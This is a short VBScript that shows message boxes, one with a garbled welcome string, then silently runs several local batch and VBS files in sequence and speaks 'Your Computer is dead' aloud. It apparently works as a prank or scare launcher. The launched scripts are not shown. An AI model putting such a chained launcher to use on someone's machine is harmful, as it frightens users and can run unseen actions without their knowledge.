a=msgbox("Hello",0+64,"title")
msg2 = msgbox("Welcome to §¬æ║j◄U►.",0+64,"Trying...")

set wshshell = wscript.CreateObject("WScript.Shell")
wshshell.run ".\data\bat\file0.bat"
wscript.sleep 2000
wshshell.run ".\data\bat\file1.bat"
wscript.sleep 2000
wshshell.run ".\data\bat\file2.bat"
wscript.sleep 3000
wshshell.run ".\data\vbs\file0.vbs"

set speechobject = createobject("sapi.spvoice")
speechobject.speak "Your Computer is dead"
speechobject.speak "Your Computer is dead"


